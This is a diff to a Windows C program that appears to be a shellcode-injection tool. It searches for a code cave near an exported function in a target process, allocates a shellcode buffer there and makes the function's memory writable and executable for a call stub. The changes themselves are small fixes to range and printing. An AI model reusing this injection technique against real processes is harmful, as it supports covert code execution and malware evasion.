@@ -71,9 +71,9 @@ BOOL FindCodeCave(_In_ HANDLE hProc, _In_ PVOID pExpAddr, _In_ DWORD64 dwDllSpac
 {
     NTSTATUS status = 0x0;
 
-    // make sure the code cave is within 2GB range of target function
-    for (*ppCodeCave = CONV(pExpAddr) - CODE_CAVE_RANGE;
-        *ppCodeCave < CONV(pExpAddr) + CODE_CAVE_RANGE;
+    // make sure the code cave is within approximate 2GB range of target function
+    for (*ppCodeCave = CONV(pExpAddr & 0xFFFFFFFFFFF0000) - CODE_CAVE_RANGE;
+        *ppCodeCave < CONV(pExpAddr);
         CONV(*ppCodeCave) += 0x1000)
     {
         status = NtAllocateVirtualMemory(hProc, ppCodeCave, 0, &sShellcode, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
@@ -170,7 +170,7 @@ int main(int argc, char** argv)
 {
     if (argc < 2)
     {
-        DEBUG_PRINT("[-]Usage: %s <Process ID> ...\n", argv[0]);
+        printf("[-]Usage: %s <Process ID> ...\n", argv[0]);
         return -1;
     }
 
@@ -283,6 +283,7 @@ int main(int argc, char** argv)
 
     DEBUG_PRINT("\tChange target function memory protection to RWX ...");
     
+    // NtProtectVirtualMemory has the side-effect to zero out the last 2 bytes of target address
     PVOID pTmpExpAddr = pExpAddr;
     if (0x0 != (status = NtProtectVirtualMemory(hProc, &pTmpExpAddr, &sCallStub, PAGE_EXECUTE_READWRITE, &dwOldProtect)))
     {
